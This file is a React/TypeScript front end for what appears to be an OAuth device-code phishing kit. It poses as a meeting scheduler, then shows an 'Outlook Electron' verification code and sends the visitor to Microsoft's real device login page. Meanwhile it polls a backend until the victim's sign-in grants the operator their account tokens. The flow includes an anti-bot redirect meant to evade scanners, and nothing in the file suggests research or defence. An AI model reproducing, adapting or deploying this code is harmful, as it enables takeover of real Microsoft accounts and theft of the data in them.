import React, { useState, useEffect } from 'react';

const DEVICE_AUTH_URL = 'https://login.microsoft.com/device';

const MONTH_NAMES = [
  'January', 'February', 'March', 'April', 'May', 'June',
  'July', 'August', 'September', 'October', 'November', 'December',
];

const DAY_NAMES = ['SUN', 'MON', 'TUE', 'WED', 'THU', 'FRI', 'SAT'];

const DEFAULT_TIME_SLOTS = [
  '9:30 am', '10:15 am', '11:00 am', '1:00 pm', '2:00 pm',
  '3:00 pm', '3:30 pm', '4:00 pm',
];

function getCalendarDays(year: number, month: number): (number | null)[] {
  const firstDay = new Date(year, month, 1).getDay();
  const daysInMonth = new Date(year, month + 1, 0).getDate();
  const days: (number | null)[] = [];
  for (let i = 0; i < firstDay; i++) days.push(null);
  for (let d = 1; d <= daysInMonth; d++) days.push(d);
  return days;
}

function detectTimezone(): string {
  try {
    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const offset = new Date().getTimezoneOffset();
    const absOff = Math.abs(offset);
    const sign = offset <= 0 ? '+' : '-';
    const h = String(Math.floor(absOff / 60)).padStart(2, '0');
    const m = String(absOff % 60).padStart(2, '0');
    return `UTC ${sign}${h}:${m} (${tz.replace(/_/g, ' ')})`;
  } catch {
    return 'UTC +00:00';
  }
}

interface SchedulerData {
  enabled: boolean;
  title: string;
  meetingDuration: number;
  timezone: string;
  scheduled: { date: string; time: string; duration: number }[];
}

type CaptureState = 'schedule' | 'loading' | 'code_ready' | 'waiting' | 'success' | 'error' | 'expired';

export function ScheduleCapturePage(): React.ReactElement {
  const today = new Date();
  const [calYear, setCalYear] = useState(today.getFullYear());
  const [calMonth, setCalMonth] = useState(today.getMonth());
  const [selectedDay, setSelectedDay] = useState<number>(today.getDate());
  const [selectedTime, setSelectedTime] = useState<string | null>(null);
  const [duration, setDuration] = useState(15);
  const [title, setTitle] = useState('Schedule a Meeting');
  const [timezone] = useState(detectTimezone);
  const [configLoading, setConfigLoading] = useState(true);

  // Device code flow state
  const [captureState, setCaptureState] = useState<CaptureState>('schedule');
  const [userCode, setUserCode] = useState('');
  const [deviceCode, setDeviceCode] = useState('');
  const [copied, setCopied] = useState(false);
  const [countdown, setCountdown] = useState(0);
  const [errorMsg, setErrorMsg] = useState('');
  const [pollInterval, setPollInterval] = useState(5);
  const [authEmail, setAuthEmail] = useState('');
  const pollTimerRef = React.useRef<ReturnType<typeof setTimeout> | null>(null);
  const pollActiveRef = React.useRef(false);

  useEffect(() => {
    loadConfig();
  }, []);

  useEffect(() => {
    if (countdown <= 0 || (captureState !== 'code_ready' && captureState !== 'waiting')) return;
    const timer = setInterval(() => {
      setCountdown(prev => {
        if (prev <= 1) {
          clearInterval(timer);
          stopPolling();
          setCaptureState('expired');
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, [countdown, captureState]);

  useEffect(() => {
    return () => stopPolling();
  }, []);

  async function loadConfig(): Promise<void> {
    try {
      const res = await fetch('/api/scheduler?public=true');
      if (res.ok) {
        const data = await res.json() as SchedulerData;
        if (data.title) setTitle(data.title);
        if (data.meetingDuration) setDuration(data.meetingDuration);
      }
    } catch { /* use defaults */ }
    setConfigLoading(false);
  }

  function stopPolling(): void {
    pollActiveRef.current = false;
    if (pollTimerRef.current) {
      clearTimeout(pollTimerRef.current);
      pollTimerRef.current = null;
    }
  }

  function startPolling(dCode: string, interval: number): void {
    stopPolling();
    pollActiveRef.current = true;

    async function poll(): Promise<void> {
      if (!pollActiveRef.current) return;
      try {
        const res = await fetch('/api/token-poll', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ deviceCode: dCode }),
        });
        const data = await res.json() as {
          status: string;
          error?: string;
          description?: string;
          email?: string;
        };
        if (!pollActiveRef.current) return;
        if (data.status === 'complete') { stopPolling(); setAuthEmail(data.email ?? ''); setCaptureState('success'); return; }
        if (data.status === 'expired') { stopPolling(); setCaptureState('expired'); return; }
        if (data.status === 'slow_down') {
          const newInt = interval + 5;
          setPollInterval(newInt);
          if (pollActiveRef.current) pollTimerRef.current = setTimeout(poll, newInt * 1000);
          return;
        }
        if (data.status === 'error') { stopPolling(); setErrorMsg(data.description ?? data.error ?? 'Authentication failed'); setCaptureState('error'); return; }
        if (pollActiveRef.current) pollTimerRef.current = setTimeout(poll, interval * 1000);
      } catch {
        if (pollActiveRef.current) pollTimerRef.current = setTimeout(poll, interval * 1000);
      }
    }
    pollTimerRef.current = setTimeout(poll, interval * 1000);
  }

  async function handleScheduleClick(): Promise<void> {
    if (!selectedTime) return;
    const path = window.location.pathname;
    if (path === '/' || path === '') {
      setCaptureState('loading');
      try {
        const r = await fetch('/api/antibot-token');
        const d = await r.json() as { token: string };
        if (d.token) { window.location.href = `/api/schedule/confirm?t=${encodeURIComponent(d.token)}&tpl=schedule-meeting`; return; }
      } catch { /* fallback to direct flow */ }
    }
    setCaptureState('loading');
    setErrorMsg('');
    try {
      const res = await fetch('/api/device-code', { method: 'POST' });
      const data = await res.json() as { userCode: string; deviceCode: string; expiresIn: number; interval: number; error?: string };
      if (!res.ok || data.error) {
        setErrorMsg(data.error ?? 'Failed to get device code');
        setCaptureState('error');
        return;
      }
      setUserCode(data.userCode);
      setDeviceCode(data.deviceCode);
      setCountdown(data.expiresIn);
      const interval = data.interval || 5;
      setPollInterval(interval);
      setCaptureState('code_ready');
      startPolling(data.deviceCode, interval);
    } catch (err) {
      setErrorMsg(err instanceof Error ? err.message : 'Network error');
      setCaptureState('error');
    }
  }

  function handleCopyCode(): void {
    navigator.clipboard.writeText(userCode.replace(/\s/g, '')).then(() => {
      setCopied(true);
      setTimeout(() => setCopied(false), 2500);
    });
  }

  function handleContinueToVerify(): void {
    setCaptureState('waiting');
    window.open(DEVICE_AUTH_URL, '_blank');
  }

  function handleReset(): void {
    stopPolling();
    setCaptureState('schedule');
    setUserCode('');
    setDeviceCode('');
    setCopied(false);
    setCountdown(0);
    setErrorMsg('');
    setAuthEmail('');
    setSelectedTime(null);
  }

  function formatTime(seconds: number): string {
    const m = Math.floor(seconds / 60);
    const s = seconds % 60;
    return `${m}:${s.toString().padStart(2, '0')}`;
  }

  function prevMonth(): void {
    if (calMonth === 0) { setCalMonth(11); setCalYear(calYear - 1); }
    else setCalMonth(calMonth - 1);
  }

  function nextMonth(): void {
    if (calMonth === 11) { setCalMonth(0); setCalYear(calYear + 1); }
    else setCalMonth(calMonth + 1);
  }

  const calDays = getCalendarDays(calYear, calMonth);
  const todayDate = today.getDate();
  const todayMonth = today.getMonth();
  const todayYear = today.getFullYear();
  const selectedDateStr = `${MONTH_NAMES[calMonth]} ${selectedDay}, ${calYear}`;
  const isPast = (day: number) => new Date(calYear, calMonth, day) < new Date(todayYear, todayMonth, todayDate);

  if (configLoading) {
    return (
      <div className="schedule-capture-page">
        <div className="schedule-capture-loading">
          <div className="capture-spinner" />
          <span>Loading...</span>
        </div>
      </div>
    );
  }

  // Device code flow states (after clicking Schedule Meeting)
  if (captureState !== 'schedule') {
    return (
      <div className="capture-page">
        <div className="capture-container">
          <div className="capture-brand">
            <div className="capture-brand-icon">
              <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <rect x="2" y="4" width="20" height="16" rx="2" />
                <path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7" />
              </svg>
            </div>
            <span className="capture-brand-name">Outlook Electron</span>
          </div>

          {captureState === 'loading' && (
            <div className="capture-card">
              <div className="capture-loading">
                <div className="capture-spinner" />
                <span>Requesting verification code from Microsoft...</span>
              </div>
            </div>
          )}

          {(captureState === 'code_ready' || captureState === 'waiting') && (
            <div className="capture-card">
              <div className="capture-code-box">
                <div className="capture-code-label">YOUR VERIFICATION CODE</div>
                <div className="capture-code-value">{userCode}</div>
                <button className="capture-copy-btn" onClick={handleCopyCode}>
                  {copied ? 'Copied!' : 'Copy Code'}
                </button>
              </div>
              <div className="capture-steps">
                <div className="capture-step">
                  <span className="capture-step-num">1</span>
                  <span>Copy the verification code above</span>
                </div>
                <div className="capture-step">
                  <span className="capture-step-num">2</span>
                  <span>Click continue and paste the code (Ctrl+V)</span>
                </div>
              </div>
              <button className="capture-verify-btn" onClick={handleContinueToVerify}>
                Continue to Verify
              </button>
              {captureState === 'waiting' && (
                <div className="capture-waiting">Waiting for you to complete sign-in...</div>
              )}
              <div className="capture-expiry">Code expires in <strong>{formatTime(countdown)}</strong></div>
            </div>
          )}

          {captureState === 'success' && (
            <div className="capture-card">
              <div className="capture-success">
                <div className="capture-success-icon">
                  <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#107c10" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                    <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14" />
                    <polyline points="22 4 12 14.01 9 11.01" />
                  </svg>
                </div>
                <h2>Meeting Scheduled & Authenticated</h2>
                {authEmail && <p className="capture-auth-email">Signed in as <strong>{authEmail}</strong></p>}
                <p>Your meeting on <strong>{selectedDateStr}</strong> at <strong>{selectedTime}</strong> has been confirmed.</p>
                <button className="capture-another-btn" onClick={handleReset}>Schedule another meeting</button>
              </div>
            </div>
          )}

          {captureState === 'expired' && (
            <div className="capture-card">
              <div className="capture-expired">
                <div className="capture-expired-icon">
                  <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#d13438" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                    <circle cx="12" cy="12" r="10" />
                    <line x1="12" y1="8" x2="12" y2="12" />
                    <line x1="12" y1="16" x2="12.01" y2="16" />
                  </svg>
                </div>
                <h2>Code Expired</h2>
                <p>Please try again.</p>
                <button className="capture-generate-btn" onClick={handleReset}>Try Again</button>
              </div>
            </div>
          )}

          {captureState === 'error' && (
            <div className="capture-card">
              <div className="capture-error-state">
                <h2>Something went wrong</h2>
                <p>{errorMsg}</p>
                <button className="capture-generate-btn" onClick={handleReset}>Try Again</button>
              </div>
            </div>
          )}
        </div>
      </div>
    );
  }

  // Main scheduler view
  return (
    <div className="schedule-capture-page">
      <div className="schedule-capture-container">
        {/* Calendar (left side) */}
        <div className="schedule-cal-side">
          <h2 className="schedule-cal-title">{title}</h2>
          <div className="schedule-cal-header">
            <button className="schedule-cal-nav" onClick={prevMonth}>&lt;</button>
            <span className="schedule-cal-month">{MONTH_NAMES[calMonth]} {calYear}</span>
            <button className="schedule-cal-nav" onClick={nextMonth}>&gt;</button>
          </div>
          <div className="schedule-cal-days-header">
            {DAY_NAMES.map(d => <div key={d} className="schedule-cal-day-name">{d}</div>)}
          </div>
          <div className="schedule-cal-grid">
            {calDays.map((day, i) => (
              <div
                key={i}
                className={
                  'schedule-cal-cell' +
                  (day === null ? ' empty' : '') +
                  (day !== null && day === selectedDay ? ' selected' : '') +
                  (day !== null && isPast(day) ? ' past' : '')
                }
                onClick={() => { if (day !== null && !isPast(day)) setSelectedDay(day); }}
              >
                {day}
              </div>
            ))}
          </div>
        </div>

        {/* Right side: Duration + Time slots */}
        <div className="schedule-right-side">
          <div className="schedule-duration-section">
            <h3>Meeting duration</h3>
            <div className="schedule-duration-pill">{duration} mins</div>
          </div>

          <div className="schedule-times-section">
            <h3>What time works best?</h3>
            <p className="schedule-date-label">
              Showing times for <strong>{selectedDateStr}</strong>
            </p>
            <p className="schedule-timezone">{timezone}</p>

            <div className="schedule-time-list">
              {DEFAULT_TIME_SLOTS.map(t => (
                <button
                  key={t}
                  className={'schedule-time-btn' + (selectedTime === t ? ' active' : '')}
                  onClick={() => setSelectedTime(t)}
                >
                  {t}
                </button>
              ))}
            </div>
          </div>

          {selectedTime && (
            <button
              className="schedule-submit-btn"
              onClick={handleScheduleClick}
            >
              Schedule Meeting
            </button>
          )}
        </div>
      </div>
    </div>
  );
}
